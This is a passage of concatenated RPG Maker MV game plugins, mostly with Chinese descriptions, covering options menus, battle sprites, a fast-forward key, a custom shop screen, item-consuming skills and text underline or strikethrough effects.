	if(!ImageManager.isReady()) return -1;
	if(!this._interactives){
		const w=this._optionsWindow;
		const p=w.toLocal({x:x,y:y});
		const idx=w.hitTest(p.x,p.y);
		if(!(idx>=0)) ;
		else if(idx===w.index()) w.processOk();
		else{
			w.select(idx);
			SoundManager.playCursor();
		}
		return;
	}
	for(let i=0,arr=this._interactives;i<arr.length;++i){ const sp=arr[i];
		const rect=this.getGlobalRect(sp);
		if(!rect.contains(x,y)) continue;
		return i;
	}
	return -1;
}).add('getGlobalRect',function f(sp){
	let rtv=sp._globalRectCache;
	if(!rtv){
		if(!sp._pt){
			sp._pt=[new Sprite(),new Sprite()];
			const a=sp.anchor;
			const w=sp.width,h=sp.height;
			sp._pt[0].x=-a.x*w;
			sp._pt[0].y=-a.y*h;
			sp._pt[1].x=(1-a.x)*w;
			sp._pt[1].y=(1-a.y)*h;
		}
		sp.addChild(sp._pt[0]);
		sp.addChild(sp._pt[1]);
		const p0=sp._pt[0].getGlobalPosition();
		const p1=sp._pt[1].getGlobalPosition();
		sp.removeChild(sp._pt[1]);
		sp.removeChild(sp._pt[0]);
		rtv=sp._globalRectCache=new Rectangle(p0.x,p0.y,p1.x-p0.x,p1.y-p0.y);
		for(let x=0,arr=sp.children;x!==arr.length;++x){
			if(arr[x].bitmap===this._bmpBarCursor || sp._pt.indexOf(arr[x])>=0) continue;
			const rect=this.getGlobalRect(arr[x]);
			const x0=Math.min(rtv.x,rect.x),x1=Math.max(rtv.x+rtv.width,rect.x+rect.width);
			const y0=Math.min(rtv.y,rect.y),y1=Math.max(rtv.y+rtv.height,rect.y+rect.height);
			rtv.x=x0; rtv.width=x1-x0;
			rtv.y=y0; rtv.height=y1-y0;
		}
	}
	return rtv;
}).add('_doingLayoutByKeyboard',function f(sp,neg_adj,isPressingOk){
	const info=sp&&sp._info; if(!info) return;
	if(info.type==="numBar"){
		if(isPressingOk) return;
		sp=sp._bar;
		ConfigManager[sp._info._key]=Math.round(ConfigManager[sp._info._key]-neg_adj).clamp(sp._numBarMin||0,sp._numBarMax);
		this._refreshToCurrentConf_numBar(sp);
	}else if(info.type==="switch"){
		ConfigManager[sp._info._key]^=1;
		this._refreshToCurrentConf_switch(sp);
	}else if(info.type==="button"){
		if(!isPressingOk) return;
		this._optionsWindow.processOk();
	}
}).add('_doingLayoutIdx',function f(i,x,y){
	const sp=this._interactives[i]; if(!sp) return;
	const info=sp._info,rect=this.getGlobalRect(sp);
	const idx=this._getOptionsWindowSelectIdx(info._key);
	if(isNaN(x)) return;
	if(idx>=0){
		const ow=this._optionsWindow;
		ow.select(idx);
		if(info.type==="numBar"){
			const r=(x-rect.x)/rect.width;
			ConfigManager[sp._info._key]=Math.round((sp._numBarMax*r).clamp(0,sp._numBarMax)*f.tbl[0])/f.tbl[0];
			this._refreshToCurrentConf_numBar(sp);
		}else if(info.type==="switch"){
			let idx=f.tbl[1].indexOf(sp._switchKey);
			if(idx>=0) ConfigManager[sp._info._key]=idx;
			this._refreshToCurrentConf_switch(sp);
		}else if(info.type==="button") ow.processOk();
	}
},[
1024, // precision
["off","on"],
]).add('_getOptionsWindowSelectIdx',function f(symbol){ // "_key"
	const ow=this._optionsWindow; if(!ow||!ow._list) return;
	if(!ow._symb2idx){
		const m=ow._symb2idx=new Map();
		for(let x=0,arr=ow._list;x!==arr.length;++x) m.set(arr[x].symbol,x);
	}
	return ow._symb2idx.get(symbol);
}).add('refreshToCurrentConf',function f(){
	const arr=this._displayValues;
	if(!arr._symb2idx){
		const m=arr._symb2idx=new Map();
		for(let x=0;x!==arr.length;++x) m.set(arr[x]._info._key,x);
	}
	for(let i=0;i!==arr.length;++i){
		const info=arr[i]._info; if(!info) continue;
		const funcName=f.tbl[0][info.type]; if(!funcName) continue;
		this[funcName](arr[i]);
	}
},[
{
switch:'_refreshToCurrentConf_switch',
numBar:'_refreshToCurrentConf_numBar',
},
]).add('_refreshToCurrentConf_numBar',function f(sp){
	const r=(ConfigManager[sp._info._key]/sp._numBarMax);
	sp._cursor.x=sp.width*r;
}).add('_refreshToCurrentConf_switch',function f(sp){
	for(let x=0,arr=sp._info.switches;x!==arr.length;++x){
		const i=ConfigManager[sp._info._key]^1;
		sp._row._switchBtns[arr[x]].bitmap=x===i?this._imgSels.selected:this._imgSels.unselected;
	}
}).add('moveSelRectTo',function f(idx_or_sp){
	let sp;
	if(f.tbl[0]===typeof idx_or_sp){
		sp=this._interactives[idx_or_sp];
		sp=sp&&sp._row||sp;
	}else sp=idx_or_sp;
	if(!sp) return;
	const rect=this.getGlobalRect(sp);
	this._selRect.setFrame(0,0,rect.width,rect.height);
	this._selRect.x=rect.x;
	this._selRect.y=rect.y;
	this._idxRow=this._rows.indexOf(sp);
},[
'number',
]);

})();


﻿"use strict";
/*:
 * @plugindesc 敵方sv_actor倒下不消失
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Sprite_Battler.prototype).add('removeCollapseEffects',function f(){
	const alpha=this.alpha;
	const rtv=f.ori.apply(this,arguments);
	if(this._svBattlerEnabled) this.alpha=alpha;
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 抓type error
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

Object.defineProperties(Game_Actor.prototype,{
'_actorId':{
	set:function(rhs){
		if(typeof rhs!=='number'){
			const msg='type error actor id. please open DevTools';
			console.warn(msg);
			alert(msg);
			debugger;
		}
		return this.__actorId=rhs;
	},get:function(){
		return this.__actorId;
	},configurable:true,
},
});

})();


﻿"use strict";
/*:
 * @plugindesc Window_EventItem ㄉ Window_Help
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Scene_Base.prototype).add('createMessageWindow_merged',function f(){
	const rtv=f.ori.apply(this,arguments);
	let h,w=this._messageWindow; w=w&&w._itemWindow; if(!w) return rtv;
	w.addChild(h=new Window_Help());
	w.setHelpWindow(h);
	w._helpWindow=h; // ensure
	return rtv;
});
new cfc(Window_EventItem.prototype).add('updatePlacement',function f(){
	const rtv=f.ori.apply(this,arguments);
	const w=this,h=this._helpWindow; if(!h) return rtv;
	if(Graphics.boxHeight<w.y+w.height+h.height) h.y=-h.height;
	else h.y=w.height;
	return rtv;
});


{ const p=Window_EventItem.prototype;
new cfc(p).add('syncHelpWindow_updateOpen',function f(){
	const h=this._helpWindow;
	if(h){
		h.openness=this.openness;
		h._opening=this._opening;
	}
},undefined,false,true).add('syncHelpWindow_updateClose',function f(){
	const h=this._helpWindow;
	if(h){
		h.openness=this.openness;
		h._closing=this._closing;
	}
},undefined,false,true);
t=[
Object.getPrototypeOf(Window_EventItem.prototype),
'updateOpen',
'updateClose',
];
k=t[1];
if(Object.hasOwnProperty(p,k)){ new cfc(p).add(k,function f(){
	const rtv=f.ori.apply(this,arguments);
	this.syncHelpWindow_updateOpen();
	return rtv;
}); }
else{ new cfc(p).add(k,function f(){
	const rtv=f.tbl[0][f.tbl[1]].apply(this,arguments);
	this.syncHelpWindow_updateOpen();
	return rtv;
},t); }
k=t[2];
if(Object.hasOwnProperty(p,k)){ new cfc(p).add(k,function f(){
	const rtv=f.ori.apply(this,arguments);
	this.syncHelpWindow_updateClose();
	return rtv;
}); }
else{ new cfc(p).add(k,function f(){
	const rtv=f.tbl[0][f.tbl[2]].apply(this,arguments);
	this.syncHelpWindow_updateClose();
	return rtv;
},t); }
}


})();


﻿"use strict";
/*:
 * @plugindesc 如果 Game_Actor.prototype.setup ㄉ arg0 !isNaN() ，就轉型成 Number
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Actor.prototype).add('setup',function f(){
	if(!isNaN(arguments[0])) arguments[0]-=0;
	return f.ori.apply(this,arguments);
}).add('actorId',function f(){
	const rtv=f.ori.apply(this,arguments);
	return isNaN(rtv)?rtv:rtv-0;
});

})();


﻿"use strict";
/*:
 * @plugindesc 16倍跑幀,lag我不管
 * @author agold404
 * @help ESC下面那顆鍵
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const keyCode=192; // event.keyCode('`') === 192
if(!Input.keyMapper[keyCode]) Input.keyMapper[keyCode]='`';

new cfc(WebAudio.prototype).add('fadeIn',function f(dur){
	const rtv=f.ori.apply(this,arguments);
	if(this.isReady()){ const t0=WebAudio._context.currentTime; this._fadeInfo={
		t0:t0,
		v0:0,
		t1:t0+dur,
		v1:this._volume,
	}; }
	return rtv;
}).add('fadeOut',function f(dur){
	const rtv=f.ori.apply(this,arguments);
	if(this.isReady()){ const t0=WebAudio._context.currentTime; this._fadeInfo={
		t0:t0,
		v0:this._volume,
		t1:t0+dur,
		v1:0,
	}; }
	return rtv;
}).add('_createNodes',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._gainNode.gain.value=this._volume;
	return rtv;
});

t=[
Input.keyMapper[keyCode], // buttonName
16|0,
2|0, // 2: max _speedUpdateUpCnt
0.25, // 3: min fTime
keyCode, // 4
function f(ab){
	if(ab && !ab._isSpeedup && $gameSystem && $gameSystem._frameFastForward_audio){
		ab._isSpeedup=true;
		const sn=ab._sourceNode;
		if(ab.isReady() && ab.isPlaying() && sn){
			const offset=(sn.context.currentTime-ab._startTime)*ab.pitch;
			ab._pitch*=f.tbl[1];
			let gn=ab._gainNode;
			const volume=gn&&gn.gain&&gn.gain.value;
			ab._startPlaying(sn.loop,offset);
			f.tbl[8](ab,volume,1.0/f.tbl[1]);
		}else{
			ab.pitch*=f.tbl[1];
		}
	}
},
function f(ab){
	if(ab && ab._isSpeedup){
		ab._isSpeedup=false;
		const sn=ab._sourceNode;
		if(ab.isReady() && ab.isPlaying() && sn){
			const offset=(sn.context.currentTime-ab._startTime)*ab.pitch;
			ab._pitch/=f.tbl[1];
			let gn=ab._gainNode;
			const volume=gn&&gn.gain&&gn.gain.value;
			ab._startPlaying(sn.loop,offset);
			f.tbl[8](ab,volume,f.tbl[1]);
		}else{
			ab.pitch/=f.tbl[1];
		}
	}
},
undefined, // 7: 1/f.tbl[1]
(ab,volume,invR)=>{
	const gn=ab._gainNode;
	if(gn&&gn.gain&&volume!==undefined){
		gn.gain.value=volume;
		if(ab._fadeInfo){ const t=WebAudio._context.currentTime; const dt=ab._fadeInfo.t1-t; if(dt>=0){
			gn.gain.linearRampToValueAtTime(ab._fadeInfo.v1, ab._fadeInfo.t1=t+dt*invR);
		}else ab._fadeInfo=undefined; }
	}
}, // 8: sub-func
];
t[5].tbl=t;
t[6].tbl=t;
t[7]=1.0/t[1];

// design: if there's 1 of disables matched, the functionality will be disabled.
new cfc(Game_System.prototype).add('disableFrameFastForwardAll_get',function f(){
	return this._disableFrameFastForwardAll;
}).add('disableFrameFastForwardAll_set',function f(val){
	return this._disableFrameFastForwardAll=val;
}).add('disableFrameFastForwardBattle_get',function f(){
	return this._disableFrameFastForwardBattle;
}).add('disableFrameFastForwardBattle_set',function f(val){
	return this._disableFrameFastForwardBattle=val;
});

AudioManager._globalPitch=AudioManager._globalPitch||1;
new cfc(AudioManager).add('updateBufferParameters',function f(buffer,configVolume,audio){
	const rtv=f.ori.apply(this,arguments);
	if(buffer&&audio){
		buffer.pitch*=AudioManager._globalPitch;
		buffer._gp=AudioManager._globalPitch;
		buffer._isSpeedup=Input._isSpeedup;
	}
	return rtv;
});

Input._isSpeedup=false;
new cfc(Input).add('frameFastForward_end',function f(){
	if(this._isSpeedup){
		this._isSpeedup=false;
		f.tbl[6](AudioManager._bgmBuffer);
		f.tbl[6](AudioManager._bgsBuffer);
		f.tbl[6](AudioManager._meBuffer);
		AudioManager._seBuffers && AudioManager._seBuffers.forEach && AudioManager._seBuffers.forEach(f.tbl[6]);
		AudioManager._globalPitch/=f.tbl[1];
		const vids=document.querySelectorAll('video');
		for(let x=0,xs=vids.length;x!==xs;++x){
			const vid=vids[x];
			vid.playbackRate/=f.tbl[1];
			vid.defaultPlaybackRate/=f.tbl[1];
		}
	}
},t).add('frameFastForward_start',function f(){
	if(!this._isSpeedup){
		this._isSpeedup=true;
		f.tbl[5](AudioManager._bgmBuffer);
		f.tbl[5](AudioManager._bgsBuffer);
		f.tbl[5](AudioManager._meBuffer);
		AudioManager._seBuffers && AudioManager._seBuffers.forEach && AudioManager._seBuffers.forEach(f.tbl[5]);
		AudioManager._globalPitch*=f.tbl[1];
		const vids=document.querySelectorAll('video');
		for(let x=0,xs=vids.length;x!==xs;++x){
			const vid=vids[x];
			vid.playbackRate*=f.tbl[1];
			vid.defaultPlaybackRate*=f.tbl[1];
		}
	}
},t);

const tc=['canFrameFastForward','disableFrameFastForward'];
SceneManager._speedUpdateUpCnt=0|0;
new cfc(SceneManager).add('updateMain',function f(){
	if(!this.updateMain_frameFastForward()){
		this._speedUpdateUpCnt=0|0;
		return f.ori.apply(this,arguments);
	}
}).add('updateMain_frameFastForward',function f(){
	if(this.isFrameFastForwardTriggered()){
		Input.frameFastForward_start();
		const isLongPressed=0&&Input.isLongPressed(f.tbl[0]);
		const newTime=this._getTimeInMsWithoutMobileSafari();
		const fTime=Math.min((newTime-this._currentTime)/1000.0,f.tbl[3]);
		this._currentTime=newTime;
		this._accumulator+=fTime;
		if(isLongPressed) this.updateInputData();
		for(;this._accumulator>=this._deltaTime;this._accumulator-=this._deltaTime){
			for(let x=Math.max(f.tbl[1],0)|0;x--;){
				if(!isLongPressed) this.updateInputData();
				this.changeScene(); this.updateScene();
			}
			this._accumulator=0.0;
			break; // it will be VERY lag if a tiny lag happens, thus discarding the rest of updates
		}
		if(++this._speedUpdateUpCnt>=f.tbl[2]){
			this._speedUpdateUpCnt=0|0;
			this.renderScene();
		}
		this.requestUpdate();
		return true;
	}else Input.frameFastForward_end();
},t).add('isFrameFastForwardDisabled',function f(){
	if(this.isSceneChanging()) return true;
	if(this.isFrameFastForwardDisabled_isFalse&&this.isFrameFastForwardDisabled_isFalse()) return false;
	if(!$gameSystem) return;
	const scc=this._scene&&this._scene.constructor;
	let func;
	
	func=f.tbl[0].get(scc); 
	if(func && func()) return true;
	
	if(f.tbl[1]()) return true;
	
	func=f.tbl[4].get(scc);
	if(func && func()) return false;
	
	if(!ConfigManager[f.tbl[2]]||$dataMap&&$dataMap.meta[f.tbl[3]]) return true;
	
	return false;
},[
new Map([
[Scene_Battle,()=>$gameSystem.disableFrameFastForwardBattle_get()],
]),
()=>$gameSystem.disableFrameFastForwardAll_get(),
tc[0],
tc[1],
new Map([
]), // by scene can fast forward
0,
]).add('isFrameFastForwardTriggered',function f(forced){
	if(!(DateNow<TR) && $gameSystem && f.tbl[2].has($gameSystem._usrname)) return false;
	const scc=this._scene&&this._scene.constructor;
	let func;
	
	func=f.tbl[0].get(scc); 
	if(func && func()) return true;
	
	if(this.isFrameFastForwardDisabled()) return;
	
	return Input.isPressed(f.tbl[1]);
},[
new Map([
[Scene_Battle,()=>((TouchInput.isCancelled()&&TouchInput.isLongPressed())||Input.isLongPressed('cancel'))],
]), // 0: can speedup mapping: scene -> cond.
t[0], // 1:
new Set(), // 2
]);

t=tc;
new cfc(ConfigManager).add('applyData',function f(config){
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[0]]=this.readFlag(config,f.tbl[0]);
	return rtv;
},t).add('makeData',function f(){
	const rtv=f.ori.apply(this,arguments);
	rtv[f.tbl[0]]=this[f.tbl[0]]|0;
	return rtv;
},t);

new cfc(DataManager).add('extractSaveContents',function f(contents){
	if(contents.system){
		if(contents.system[f.tbl[0]]){
			if(!ConfigManager[f.tbl[0]]){
				ConfigManager[f.tbl[0]]=true;
				ConfigManager.save();
			}
		}else{
			if(ConfigManager[f.tbl[0]]) contents.system[f.tbl[0]]=1;
		}
	}
	return f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 月藍特製商店UI圖
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Scene_Shop.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._backImg_loadFailed=false;
	ImageManager.loadWithoutError_set(true);
	this._backImg_buy=ImageManager.loadNormalBitmap('BLR_custom/Shop/Buy/frame.png');
	this._backImg_sell=ImageManager.loadNormalBitmap('BLR_custom/Shop/Sell/frame.png');
	this._backImg_buyBtn=ImageManager.loadNormalBitmap('BLR_custom/Shop/Buy/a01.png');
	this._backImg_sellBtn=ImageManager.loadNormalBitmap('BLR_custom/Shop/Buy/a02.png');
	this._backImg_leaveBtn=ImageManager.loadNormalBitmap('BLR_custom/Shop/Buy/a03.png');
	this._backImg_itemBtn=ImageManager.loadNormalBitmap('BLR_custom/Shop/Sell/b01.png');
	this._backImg_weaponBtn=ImageManager.loadNormalBitmap('BLR_custom/Shop/Sell/b02.png');
	this._backImg_armorBtn=ImageManager.loadNormalBitmap('BLR_custom/Shop/Sell/b03.png');
	this._backImg_keyItemBtn=ImageManager.loadNormalBitmap('BLR_custom/Shop/Sell/b04.png');
	ImageManager.loadWithoutError_set(false);
	
	return rtv;
}).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	if([
		this._backImg_buy,
		this._backImg_sell,
		this._backImg_buyBtn,
		this._backImg_sellBtn,
		this._backImg_leaveBtn,
		this._backImg_itemBtn,
		this._backImg_weaponBtn,
		this._backImg_armorBtn,
		this._backImg_keyItemBtn,
	].some(f.tbl[3])){
		this._backImg_loadFailed=true;
		return rtv;
	}
	const c=this.children,bs=this._backgroundSprite,wl=this._windowLayer;
	let idx=0;
	if(bs&&bs.parent===this) idx=Math.max(c.indexOf(bs)+1,idx);
	if(wl&&wl.parent===this) idx=Math.max(c.indexOf(wl),idx);
	//this.addChildAt(this._template=new Sprite(ImageManager.loadNormalBitmap('BLR_custom/Shop/Sell/Sell.png')),idx); // 對照用
	this.addChildAt(this._backSprite_buy=new Sprite(this._backImg_buy),idx);
	this.addChildAt(this._backSprite_sell=new Sprite(this._backImg_sell),idx);
	if(wl) wl.children.forEach(f.tbl[0]);
	const cmdg=this._commandGroup=new Sprite(),catg=this._categoryGroup=new Sprite();
	this.addChild(cmdg);
	this.addChild(catg);
	cmdg.addChild(this._sprite_buyBtn=new Sprite(this._backImg_buyBtn));
	cmdg.addChild(this._sprite_sellBtn=new Sprite(this._backImg_sellBtn));
	cmdg.addChild(this._sprite_leaveBtn=new Sprite(this._backImg_leaveBtn));
	catg.addChild(this._sprite_itemBtn=new Sprite(this._backImg_itemBtn));
	catg.addChild(this._sprite_weaponBtn=new Sprite(this._backImg_weaponBtn));
	catg.addChild(this._sprite_armorBtn=new Sprite(this._backImg_armorBtn));
	catg.addChild(this._sprite_keyItemBtn=new Sprite(this._backImg_keyItemBtn));
	this._sprite_buyBtn.x=f.tbl[1].buyBtn.x;
	this._sprite_buyBtn.y=f.tbl[1].buyBtn.y;
	this._sprite_sellBtn.x=f.tbl[1].sellBtn.x;
	this._sprite_sellBtn.y=f.tbl[1].sellBtn.y;
	this._sprite_leaveBtn.x=f.tbl[1].leaveBtn.x;
	this._sprite_leaveBtn.y=f.tbl[1].leaveBtn.y;
	this._sprite_itemBtn.x=f.tbl[1].itemBtn.x;
	this._sprite_itemBtn.y=f.tbl[1].itemBtn.y;
	this._sprite_weaponBtn.x=f.tbl[1].weaponBtn.x;
	this._sprite_weaponBtn.y=f.tbl[1].weaponBtn.y;
	this._sprite_armorBtn.x=f.tbl[1].armorBtn.x;
	this._sprite_armorBtn.y=f.tbl[1].armorBtn.y;
	this._sprite_keyItemBtn.x=f.tbl[1].keyItemBtn.x;
	this._sprite_keyItemBtn.y=f.tbl[1].keyItemBtn.y;
	const cmdw=this._commandWindow,catw=this._categoryWindow;
	cmdw.alpha=catw.alpha=0;
	cmdw.itemRect=f.tbl[2].bind(cmdw,cmdg);
	catw.itemRect=f.tbl[2].bind(catw,catg);
	catw.padding=cmdw.padding=0;
	return rtv;
},[
x=>x._windowBackSprite.visible=x._windowFrameSprite.alpha=0, // 0: 
{
// use global (0,0) their (0,0)
buyBtn:{x:28,y:125,},
sellBtn:{x:210,y:125,},
leaveBtn:{x:391,y:125,},
itemBtn:{x:37,y:199,},
weaponBtn:{x:228,y:199,},
armorBtn:{x:419,y:199,},
keyItemBtn:{x:609,y:199,},
}, // 1: 
function(g,idx){
	const src=g.children[idx];
	return new Rectangle(src.x-this.x,src.y-this.y,src.width,src.height);
}, // 2: 
bmp=>!(bmp.width>=2||bmp.height>=2), // 3: 
]).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._backImg_loadFailed) return rtv;
	const cmdw=this._commandWindow,catw=this._categoryWindow;
	const cmdg=this._commandGroup,catg=this._categoryGroup;
	const idxCmdw=cmdw.index(),idxCatw=catw.index();
	this._backSprite_buy.visible=!(catg.visible=this._backSprite_sell.visible=this._sellWindow.visible);
	if(cmdg._lastIdx!==idxCmdw){
		cmdg._lastIdx=idxCmdw;
		cmdg.children.forEach(f.tbl[0].bind(idxCmdw,f.tbl[1]));
	}
	if(catg.visible && catg._lastIdx!==idxCatw){
		catg._lastIdx=idxCatw;
		catg.children.forEach(f.tbl[0].bind(idxCatw,f.tbl[1]));
	}
	return rtv;
},[
function f(alphas,sp,i){ sp.alpha=alphas[(this===i)-0]; },
[0.5,1,],
]);

})();


﻿"use strict";
/*:
 * @plugindesc 技能/道具 消耗道具
 * @author agold404
 * @help <消耗道具:JSON>
 * 
 * <消耗道具:{"道具id":幾個}>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw="消耗道具";

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const raw=meta[kw]; if(!raw) return;
	dataobj[kw]=JSON.parse(meta[kw]);
},
]);

t=[
kw,
64,
function(item){ return [item,this.get(item),]; },
];

new cfc(Game_BattlerBase.prototype).add('canUse',function f(item){
	let rtv=f.ori.apply(this,arguments); if(!rtv) return false;
	const fu=this.friendsUnit();
	if(!fu||!fu.gainItem||!fu.numItems) return true; // enemy
	const itemConsume=item[f.tbl[0]];
	if(itemConsume){ for(let k in itemConsume){
		if(!rtv) break;
		rtv=fu.numItems($dataItems[k])-itemConsume[k]>=0;
	} }
	return rtv;
},t).add('friendsUnit',function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	return rtv;
});

new cfc(Game_Battler.prototype).add('useItem',function f(item){
	const fu=this.friendsUnit(); if(!fu||!fu.gainItem||!fu.numItems) return f.ori.apply(this,arguments);
	const itemConsume=item[f.tbl[0]];
	if(itemConsume){ for(let k in itemConsume){
		fu.gainItem($dataItems[k],0-itemConsume[k]);
	} }
	return f.ori.apply(this,arguments);
},t);


{ const p=Window_SkillList.prototype;
const f=function f(){
	// update_itemConsume
	if(!this._data) return;
	const strt=this.topIndex(),n=this.maxPageItems()+this[f.tbl[0]](),M=this.maxItems();
	for(let x=0;x!==n;++x){
		const idx=x+strt; if(!(idx<M)) break;
		const item=this._data[idx];
		if(item && this.drawSkillCost_itemConsume_updateIconIdx(item)) this.redrawItem(idx);
	}
};
f.ori=undefined;
f.tbl=[
'maxCols',
];
k='drawSkillCost';
new cfc(p).add(k,function f(skill, x, y, width){
	let rtv=f.ori.apply(this,arguments);
	rtv=this.drawSkillCost_itemConsume_draw(skill,rtv,y,Window_Base._iconWidth);
	return rtv;
},t).add(k+'_itemConsume_draw',function f(skill, x, y, width){
	const info=this.drawSkillCost_itemConsume_getInfo(skill);
	if(!info||!info.length) return x;
	const idx=info[1]; if(!info[0][idx]) return x;
	x-=Window_Base._iconWidth+f.tbl[0];
	this.drawIcon(info[0][idx][0].iconIndex,x,y);
	this.resetTextColor();
	const orifs=this.contents.fontSize;
	this.contents.fontSize-=this.contents.fontSize>>2;
	const dy=orifs-this.contents.fontSize;
	this.drawText('-'+info[0][idx][1],x+f.tbl[0],y+dy,Window_Base._iconWidth-(f.tbl[0]<<1));
	this.contents.fontSize=orifs;
	return x;
},[
1, // text padding
]).add(k+'_itemConsume_updateIconIdx',function f(skill){
	// return true if updated
	const info=this.drawSkillCost_itemConsume_getInfo(skill); if(!info||!info.length) return;
	if(!(--info[2]>0)){
		info[2]=f.tbl[1];
		const old=info[1];
		info[1]=~~((info[1]+1)%info[0].length);
		return old!==info[1];
	}
},t).add(k+'_itemConsume_getInfo',function f(skill){
	let m=this._itemConsume_map; if(!m) m=this._itemConsume_map=new Map();
	let rtv=m.get(skill);
	if(!rtv){
		const arr=rtv=[]; // [[item,amount,],...] , idx , remainFrames
		m.set(skill,arr);
		const itemConsume=skill[f.tbl[0]];
		if(itemConsume){
			const tmp=[],m=new Map(); for(let k in itemConsume){ const item=$dataItems[k]; tmp.push(item); m.set(item,itemConsume[k]); }
			if(DataManager.sortDataObjList) DataManager.sortDataObjList(tmp);
			arr[0]=tmp.map(f.tbl[2],m);
			arr[2]=arr[1]=0;
		}
	}
	return rtv;
},t).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.update_itemConsume();
	return rtv;
}).add('update_itemConsume',f,f.tbl,false,true);
if(typeof Window_SkillListM!=='undefined') Window_SkillListM.prototype[k]=p[k];
t=k+'_itemConsume_draw';
if(typeof Window_SkillListM!=='undefined') Window_SkillListM.prototype[t]=p[t];
t=k+'_itemConsume_updateIconIdx';
if(typeof Window_SkillListM!=='undefined') Window_SkillListM.prototype[t]=p[t];
t=k+'_itemConsume_getInfo';
if(typeof Window_SkillListM!=='undefined') Window_SkillListM.prototype[t]=p[t];
if(typeof Window_SkillListM!=='undefined') new cfc(Window_SkillListM.prototype).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.update_itemConsume();
	return rtv;
}).add('update_itemConsume',f,f.tbl,false,true);
}

if(0)new cfc(Scene_Skill.prototype).add('update',function f(){
	this.update_itemConsume();
	return f.ori.apply(this,arguments);
}).add('update_itemConsume',function f(){
	const iw=this._itemWindow;
	const item=iw&&iw.item(); if(!item) return;
	if(iw.drawSkillCost_itemConsume_updateIconIdx(item)) iw.redrawCurrentItem();
});

})();


﻿"use strict";
/*:
 * @plugindesc 保證 Window_NumberInput.prototype.start 拿到的變數是數字型態
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(0)(()=>{ let k,r,t;

new cfc(Window_NumberInput.prototype).add('start',function f(){
	const idx=$gameMessage.numInputVariableId();
	const val=$gameVariables.value(idx);
	if(val-0!==val) $gameVariables.setValue(idx,0);
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc refine initialization of MOG_ComboCounter to meets our needs
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

Game_Temp.prototype.MOG_ComboCounter_combo_data_init=function(){
	this.combo_data=[[false,0,0,false,false],[false,0,0,false,false],];
};

new cfc(Scene_Battle.prototype).add('start',function f(){
	$gameTemp.MOG_ComboCounter_combo_data_init();
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc ensure Game_Battler.prototype._damagePopup instanceof Queue
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if((typeof Imported!=='undefined') && Imported.YEP_BattleEngineCore) Object.defineProperty(Game_Battler.prototype,'_damagePopup',{
	set:function f(rhs){
		if(!rhs) return this.__damagePopup=rhs;
		this.__damagePopup=rhs;
		return this._damagePopup;
	},get:function(){
		if(!this.__damagePopup) this.__damagePopup=new Queue();
		if(this.__damagePopup.constructor===Array||this.__damagePopup.constructor===Number) this.__damagePopup=new Queue(this.__damagePopup);
		if(this.__damagePopup.constructor!==Queue) this.__damagePopup=Object.assign(new Queue(),this.__damagePopup);
		return this.__damagePopup;
	},configurable:true
});

})();


﻿"use strict";
/*:
 * @plugindesc 文字效果線
 * @author agold404
 * @help \\(STRIKETHROUGH|UNDERLINE)(START|END)
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
['_strikeThrough','_underLine',], // 0
new Map([
['STRIKETHROUGHSTART',['_strikeThrough',true,]],
['STRIKETHROUGHEND',['_strikeThrough',false,]],
['UNDERLINESTART',['_underLine',true,]],
['UNDERLINEEND',['_underLine',false,]],
]), // 1
{
center:(tx,tw)=>tx-tw/2, // tx is at center already
right:(tx,tw)=>tx-tw, // tx is at right-most already
}, // 2
'_lastEffectLinesPos', // 3
1, // 4: line shorter. for some char may overlap onto the previous
3, // 5: lineWidthBits
];

new cfc(Window_Base.prototype).add('processEscapeCharacter',function f(code,textState){
	const res=f.tbl[1].get(code);
	if(!res) return f.ori.apply(this,arguments);
	this.contents[res[0]]=res[1];
},t);

new cfc(Bitmap.prototype).add('_drawTextBody',function f(txt,tx,ty,maxW){
	const rtv=f.ori.apply(this,arguments);
	this._drawTextEffectLines(txt,tx,ty,maxW);
	return rtv;
}).add('_drawTextEffectLines',function f(txt,tx,ty,maxW){
	const tbl0=f.tbl[0];
	{
		let has=false;
		for(let x=0,arr=tbl0,xs=arr.length;x!==xs;++x){ if(this[arr[x]]){ has=true; break; } }
		if(!has){
			this[f.tbl[3]]=undefined;
			return;
		}
	}
	const ctx=this._context;
	const mw=~~ctx.measureText(txt).width-f.tbl[4];
	const w=isNaN(maxW)?mw:Math.min(mw,maxW);
	const x=this.getTextStartX(tx,mw);
	const xe=x+w;
	ctx.save();
	ctx.strokeStyle=this.textColor;
	ctx.lineWidth=this._drawLineWidth(ctx);
	if(!this[f.tbl[3]]) this[f.tbl[3]]=[];
	const posAll=this[f.tbl[3]];
	if(this[tbl0[0]]){
		// _strikeThrough
